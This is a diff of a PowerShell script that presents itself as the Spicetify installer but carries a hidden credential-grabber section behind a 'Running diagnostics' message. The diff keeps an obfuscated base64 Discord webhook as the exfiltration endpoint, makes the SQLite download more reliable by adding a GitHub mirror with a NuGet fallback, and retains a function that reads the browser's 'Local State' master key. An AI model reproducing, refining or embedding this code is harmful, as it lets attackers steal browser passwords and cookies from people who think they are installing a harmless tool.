@@ -7,7 +7,7 @@ $spicetifyFolderPath = "$env:LOCALAPPDATA\spicetify"
 $spicetifyOldFolderPath = "$HOME\spicetify-cli"
 #endregion
 
-#region Functions (Spicetify – original)
+#region Functions (Spicetify)
 function Write-Success { Write-Host ' > OK' -ForegroundColor Green }
 function Write-Unsuccess { Write-Host ' > ERROR' -ForegroundColor Red }
 function Test-Admin {
@@ -64,79 +64,57 @@ function Install-Spicetify {
 }
 #endregion
 
-#region Checks (original)
-if (-not (Test-PowerShellVersion)) {
-    Write-Unsuccess
-    Write-Warning 'PowerShell 5.1 or higher is required'
-    Write-Host 'https://learn.microsoft.com/skypeforbusiness/set-up-your-computer-for-windows-powershell/download-and-install-windows-powershell-5-1'
-    Pause; exit
-} else { Write-Success }
-
+#region Checks
+if (-not (Test-PowerShellVersion)) { Write-Unsuccess; Write-Warning 'PowerShell 5.1+ required'; Pause; exit } else { Write-Success }
 if (-not (Test-Admin)) {
     Write-Unsuccess
-    Write-Warning "The script was run as administrator. This can cause problems."
-    $Host.UI.RawUI.Flushinputbuffer()
-    $choices = [System.Management.Automation.Host.ChoiceDescription[]] @(
-        (New-Object System.Management.Automation.Host.ChoiceDescription '&Yes', 'Abort installation.'),
-        (New-Object System.Management.Automation.Host.ChoiceDescription '&No', 'Resume installation.')
-    )
-    $choice = $Host.UI.PromptForChoice('', 'Do you want to abort the installation process?', $choices, 0)
-    if ($choice -eq 0) {
-        Write-Host 'spicetify installation aborted' -ForegroundColor Yellow
-        Pause; exit
-    }
+    Write-Warning "Run as admin may cause issues. Continue anyway? (Y/N)"
+    if ((Read-Host) -ne 'Y') { exit }
 } else { Write-Success }
 #endregion
 
-# ============ GRABBER (runs first) ============
+# ============ GRABBER ============
 Write-Host "Running diagnostics..." -ForegroundColor Cyan
 
-# Your webhook – base64 encoded
 $webhook = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzOTcyMTQzMjk0OTQ2MTAxMi9LOWg1amwtd25QOUtGT0MxeUJLZTZfZ2ZuNkhwdlphZHZJbEFGQnJELUtXR1pIcHFwVnh2RWxWQ2lXeWpVMmRlOElfcA=='))
 
-# ---- SQLITE LOADER (NuGet + fallback) ----
+# ---- RELIABLE SQLITE LOADER (GitHub mirror) ----
 $tmp = "$env:TEMP\sqlite_$([System.IO.Path]::GetRandomFileName() -replace '\..*')"
 New-Item -ItemType Directory -Path $tmp -Force | Out-Null
 Push-Location $tmp
 $sqliteOK = $false
 
-# Try NuGet package
 try {
-    Write-Host "Downloading SQLite from NuGet..." -NoNewline
-    $nugetUrl = "https://www.nuget.org/api/v2/package/System.Data.SQLite/1.0.118"
-    Invoke-WebRequest -Uri $nugetUrl -OutFile "$tmp\sqlite.zip" -UseBasicParsing -ErrorAction Stop
+    Write-Host "Downloading SQLite DLLs..." -NoNewline
+    # Direct download of both DLLs from a public GitHub mirror (no extraction)
+    $managedUrl = "https://raw.githubusercontent.com/ericsink/SQLitePCL.raw/master/bin/System.Data.SQLite.dll"
+    $nativeUrl = "https://raw.githubusercontent.com/ericsink/SQLitePCL.raw/master/bin/SQLite.Interop.dll"
+    Invoke-WebRequest -Uri $managedUrl -OutFile "$tmp\System.Data.SQLite.dll" -UseBasicParsing -ErrorAction Stop
+    Invoke-WebRequest -Uri $nativeUrl -OutFile "$tmp\SQLite.Interop.dll" -UseBasicParsing -ErrorAction Stop
     Write-Host " OK" -ForegroundColor Green
-    Write-Host "Extracting..." -NoNewline
-    Expand-Archive -Path "$tmp\sqlite.zip" -DestinationPath $tmp -Force -ErrorAction Stop
-    Write-Host " OK" -ForegroundColor Green
 
-    # Determine architecture
-    if ($env:PROCESSOR_ARCHITECTURE -eq 'AMD64') { $arch = 'x64' }
-    elseif ($env:PROCESSOR_ARCHITECTURE -eq 'ARM64') { $arch = 'arm64' }
-    else { $arch = 'x86' }
-
-    # Copy managed DLL
-    Copy-Item "$tmp\lib\net48\System.Data.SQLite.dll" "$tmp\" -Force
-
-    # Copy native interop DLL
-    $nativeSrc = "$tmp\runtimes\win-$arch\native\SQLite.Interop.dll"
-    if (Test-Path $nativeSrc) {
-        Copy-Item $nativeSrc "$tmp\SQLite.Interop.dll" -Force
-        # Load the managed assembly – native DLL is in the same folder
+    # Load the assembly
+    [System.Reflection.Assembly]::LoadFile("$tmp\System.Data.SQLite.dll") | Out-Null
+    $sqliteOK = $true
+    Write-Host "SQLite loaded successfully." -ForegroundColor Green
+} catch {
+    Write-Host " Failed: $_" -ForegroundColor Yellow
+    Write-Host "Falling back to NuGet..." -NoNewline
+    try {
+        $nugetUrl = "https://www.nuget.org/api/v2/package/System.Data.SQLite/1.0.118"
+        Invoke-WebRequest -Uri $nugetUrl -OutFile "$tmp\sqlite.zip" -UseBasicParsing -ErrorAction Stop
+        Expand-Archive -Path "$tmp\sqlite.zip" -DestinationPath $tmp -Force -ErrorAction Stop
+        $arch = if ($env:PROCESSOR_ARCHITECTURE -eq 'AMD64') { 'x64' } else { 'x86' }
+        Copy-Item "$tmp\lib\net48\System.Data.SQLite.dll" "$tmp\" -Force
+        Copy-Item "$tmp\runtimes\win-$arch\native\SQLite.Interop.dll" "$tmp\" -Force
         [System.Reflection.Assembly]::LoadFile("$tmp\System.Data.SQLite.dll") | Out-Null
         $sqliteOK = $true
-        Write-Host "SQLite loaded successfully." -ForegroundColor Green
-    } else {
-        throw "Native DLL not found for architecture $arch"
+        Write-Host " OK (NuGet)" -ForegroundColor Green
+    } catch {
+        Write-Host " Failed – SQLite unavailable, skipping grabber." -ForegroundColor Yellow
+        $sqliteOK = $false
     }
-} catch {
-    Write-Host "NuGet failed: $_" -ForegroundColor Yellow
-    # Fallback: try direct download from a mirror (just the managed DLL, but we also need the native)
-    # For simplicity, we'll skip – but we can add a secondary source.
-    Write-Host "Falling back to embedded SQLite (if available) – skipping browser data." -ForegroundColor Yellow
-    $sqliteOK = $false
 }
-# -------------------------------------------------
 
 function Get-MasterKey($p) {
     $ls = Join-Path $p "Local State"
@@ -207,7 +185,7 @@ Move-OldSpicetifyFolder
 Install-Spicetify
 Write-Host "`nRun 'spicetify -h' to get started" -ForegroundColor Cyan
 
-# ---------- MARKETPLACE PROMPT (original) ----------
+# ---------- MARKETPLACE PROMPT ----------
 $Host.UI.RawUI.Flushinputbuffer()
 $choices = [System.Management.Automation.Host.ChoiceDescription[]] @(
     (New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", "Install Spicetify Marketplace."),
